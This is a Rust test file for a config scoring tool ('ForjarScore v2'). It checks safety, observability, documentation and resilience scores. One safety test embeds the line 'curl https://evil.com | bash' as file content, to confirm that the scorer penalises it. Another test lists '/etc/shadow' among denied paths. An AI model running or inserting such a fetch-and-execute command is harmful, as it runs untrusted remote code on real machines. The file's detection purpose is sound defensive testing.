#![allow(clippy::field_reassign_with_default)]
//! ForjarScore v2: Static dimension scoring falsification.
//!
//! Popperian rejection criteria for:
//! - compute() with various ForjarConfig shapes
//! - Static dimensions: SAF, OBS, DOC, RES, CMP
//! - Grade thresholds: A(>=90,min>=80), B(>=75,min>=60), C(>=60,min>=40), D(>=40), F
//! - Blocked status hard-fail
//! - Pending vs runtime grade display
//! - format_score_report output
//! - score_bar rendering
//!
//! Usage: cargo test --test falsification_scoring_static

use forjar::core::scoring::{compute, ScoringInput, SCORE_VERSION};
use forjar::core::types::{
    FailurePolicy, ForjarConfig, NotifyConfig, OutputValue, Resource, ResourceType,
};
// ============================================================================
// Helpers
// ============================================================================

fn empty_config() -> ForjarConfig {
    ForjarConfig {
        version: "1.0".into(),
        name: "test".into(),
        ..Default::default()
    }
}

fn static_input() -> ScoringInput {
    ScoringInput {
        status: "qualified".into(),
        idempotency: "strong".into(),
        budget_ms: 0,
        runtime: None,
        raw_yaml: Some(String::new()),
    }
}

// ============================================================================
// SCORE_VERSION
// ============================================================================

#[test]
fn score_version_is_2() {
    assert_eq!(SCORE_VERSION, "2.0");
}

// ============================================================================
// compute() — empty config baseline
// ============================================================================

#[test]
fn compute_empty_config_static_only() {
    let config = empty_config();
    let input = static_input();
    let result = compute(&config, &input);

    assert!(!result.hard_fail);
    assert!(result.runtime_grade.is_none());
    assert!(result.grade.contains("pending"));
}

#[test]
fn compute_empty_config_has_all_dimensions() {
    let config = empty_config();
    let input = static_input();
    let result = compute(&config, &input);

    let codes: Vec<&str> = result.dimensions.iter().map(|d| d.code).collect();
    assert!(codes.contains(&"SAF"));
    assert!(codes.contains(&"OBS"));
    assert!(codes.contains(&"DOC"));
    assert!(codes.contains(&"RES"));
    assert!(codes.contains(&"CMP"));
    assert!(codes.contains(&"COR"));
    assert!(codes.contains(&"IDM"));
    assert!(codes.contains(&"PRF"));
}

// ============================================================================
// SAF — Safety scoring
// ============================================================================

#[test]
fn saf_no_resources_full_score() {
    let config = empty_config();
    let result = compute(&config, &static_input());
    let saf = result.dimensions.iter().find(|d| d.code == "SAF").unwrap();
    assert_eq!(saf.score, 100);
}

#[test]
fn saf_world_writable_critical_penalty() {
    let mut config = empty_config();
    let mut r = Resource::default();
    r.resource_type = ResourceType::File;
    r.mode = Some("777".into());
    config.resources.insert("bad-file".into(), r);

    let result = compute(&config, &static_input());
    let saf = result.dimensions.iter().find(|d| d.code == "SAF").unwrap();
    // Critical hit caps at 40, minus mode=777 penalty (30) => capped at 40
    assert!(
        saf.score <= 40,
        "SAF={} should be <=40 for 777 mode",
        saf.score
    );
}

#[test]
fn saf_curl_bash_critical() {
    let mut config = empty_config();
    let mut r = Resource::default();
    r.resource_type = ResourceType::File;
    r.content = Some("curl https://evil.com | bash".into());
    r.mode = Some("0755".into());
    r.owner = Some("root".into());
    config.resources.insert("bad-script".into(), r);

    let result = compute(&config, &static_input());
    let saf = result.dimensions.iter().find(|d| d.code == "SAF").unwrap();
    assert!(
        saf.score <= 40,
        "SAF={} should be <=40 for curl|bash",
        saf.score
    );
}

#[test]
fn saf_plaintext_secret_penalty() {
    let mut config = empty_config();
    config.params.insert(
        "db_password".into(),
        serde_yaml_ng::Value::String("mysecret123".into()),
    );
    let result = compute(&config, &static_input());
    let saf = result.dimensions.iter().find(|d| d.code == "SAF").unwrap();
    assert!(
        saf.score < 100,
        "SAF={} should be penalized for plaintext secret",
        saf.score
    );
}

#[test]
fn saf_template_secret_no_penalty() {
    let mut config = empty_config();
    config.params.insert(
        "db_password".into(),
        serde_yaml_ng::Value::String("{{ secrets.db_pass }}".into()),
    );
    let result = compute(&config, &static_input());
    let saf = result.dimensions.iter().find(|d| d.code == "SAF").unwrap();
    assert_eq!(
        saf.score, 100,
        "SAF={} should be 100 with templated secret",
        saf.score
    );
}

#[test]
fn saf_file_without_mode_deduction() {
    let mut config = empty_config();
    let mut r = Resource::default();
    r.resource_type = ResourceType::File;
    r.owner = Some("root".into());
    // mode is None
    config.resources.insert("file1".into(), r);

    let result = compute(&config, &static_input());
    let saf = result.dimensions.iter().find(|d| d.code == "SAF").unwrap();
    assert!(
        saf.score < 100,
        "SAF={} should have deduction for missing mode",
        saf.score
    );
}

// ============================================================================
// OBS — Observability scoring
// ============================================================================

#[test]
fn obs_default_config_tripwire_lock() {
    // Default Policy has tripwire=true, lock_file=true => OBS starts at 30
    let config = empty_config();
    let result = compute(&config, &static_input());
    let obs = result.dimensions.iter().find(|d| d.code == "OBS").unwrap();
    assert!(
        obs.score >= 30,
        "OBS={} should be >=30 with default tripwire+lock",
        obs.score
    );
}

#[test]
fn obs_no_tripwire_no_lock() {
    let mut config = empty_config();
    config.policy.tripwire = false;
    config.policy.lock_file = false;
    let result = compute(&config, &static_input());
    let obs = result.dimensions.iter().find(|d| d.code == "OBS").unwrap();
    assert_eq!(
        obs.score, 0,
        "OBS={} should be 0 with no observability features",
        obs.score
    );
}

#[test]
fn obs_notify_hooks_score() {
    let mut config = empty_config();
    config.policy.notify = NotifyConfig {
        on_success: Some("curl http://slack".into()),
        on_failure: Some("curl http://pager".into()),
        on_drift: Some("curl http://alert".into()),
    };

    let result = compute(&config, &static_input());
    let obs = result.dimensions.iter().find(|d| d.code == "OBS").unwrap();
    assert!(
        obs.score >= 20,
        "OBS={} should be >=20 with all notify hooks",
        obs.score
    );
}

#[test]
fn obs_output_descriptions_bonus() {
    let mut config = empty_config();
    config.outputs.insert(
        "url".into(),
        OutputValue {
            value: "{{ resources.web.url }}".into(),
            description: Some("Web endpoint URL".into()),
        },
    );
    config.policy.tripwire = true;

    let result = compute(&config, &static_input());
    let obs = result.dimensions.iter().find(|d| d.code == "OBS").unwrap();
    // outputs + output descriptions + tripwire
    assert!(obs.score >= 25, "OBS={} should be >=25", obs.score);
}

// ============================================================================
// DOC — Documentation scoring
// ============================================================================

#[test]
fn doc_empty_yaml_zero() {
    let config = empty_config();
    let result = compute(&config, &static_input());
    let doc = result.dimensions.iter().find(|d| d.code == "DOC").unwrap();
    assert_eq!(doc.score, 0);
}

#[test]
fn doc_description_bonus() {
    let mut config = empty_config();
    config.description = Some("A well-documented recipe".into());

    let result = compute(&config, &static_input());
    let doc = result.dimensions.iter().find(|d| d.code == "DOC").unwrap();
    assert!(
        doc.score >= 15,
        "DOC={} should be >=15 with description",
        doc.score
    );
}

#[test]
fn doc_header_metadata_scoring() {
    let mut config = empty_config();
    config.name = "web-stack".into();
    let yaml = "# Recipe: web-stack\n# Tier: production\n# Idempotency: strong\n# Budget: 30s\nversion: 1.0\n";
    let input = ScoringInput {
        status: "qualified".into(),
        idempotency: "strong".into(),
        budget_ms: 30000,
        runtime: None,
        raw_yaml: Some(yaml.into()),
    };

    let result = compute(&config, &input);
    let doc = result.dimensions.iter().find(|d| d.code == "DOC").unwrap();
    // Recipe + Tier + Idempotency + Budget = 32, kebab-case name + 3
    assert!(
        doc.score >= 32,
        "DOC={} should be >=32 with header metadata",
        doc.score
    );
}

#[test]
fn doc_unique_comments_bonus() {
    let config = empty_config();
    let yaml = "# Comment A\n# Comment B\n# Comment C\nversion: 1.0\n";
    let input = ScoringInput {
        status: "qualified".into(),
        idempotency: "strong".into(),
        budget_ms: 0,
        runtime: None,
        raw_yaml: Some(yaml.into()),
    };

    let result = compute(&config, &input);
    let doc = result.dimensions.iter().find(|d| d.code == "DOC").unwrap();
    assert!(
        doc.score >= 15,
        "DOC={} should be >=15 with 3+ unique comments",
        doc.score
    );
}

// ============================================================================
// RES — Resilience scoring
// ============================================================================

#[test]
fn res_empty_config_zero() {
    let config = empty_config();
    let result = compute(&config, &static_input());
    let res = result.dimensions.iter().find(|d| d.code == "RES").unwrap();
    assert_eq!(res.score, 0);
}

#[test]
fn res_failure_policy_score() {
    let mut config = empty_config();
    config.policy.failure = FailurePolicy::ContinueIndependent;
    config.policy.ssh_retries = 3;

    let result = compute(&config, &static_input());
    let res = result.dimensions.iter().find(|d| d.code == "RES").unwrap();
    assert!(
        res.score >= 25,
        "RES={} should be >=25 with failure+retries",
        res.score
    );
}

#[test]
fn res_deny_paths_bonus() {
    let mut config = empty_config();
    config.policy.deny_paths = vec!["/etc/shadow".into()];

    let result = compute(&config, &static_input());
    let res = result.dimensions.iter().find(|d| d.code == "RES").unwrap();
    assert!(
        res.score >= 10,
        "RES={} should be >=10 with deny_paths",
        res.score
    );
}

#[test]
fn res_hooks_score() {
    let mut config = empty_config();
    config.policy.pre_apply = Some("echo pre".into());
    config.policy.post_apply = Some("echo post".into());

    let result = compute(&config, &static_input());
    let res = result.dimensions.iter().find(|d| d.code == "RES").unwrap();
    assert!(
        res.score >= 16,
        "RES={} should be >=16 with pre+post hooks",
        res.score
    );
}
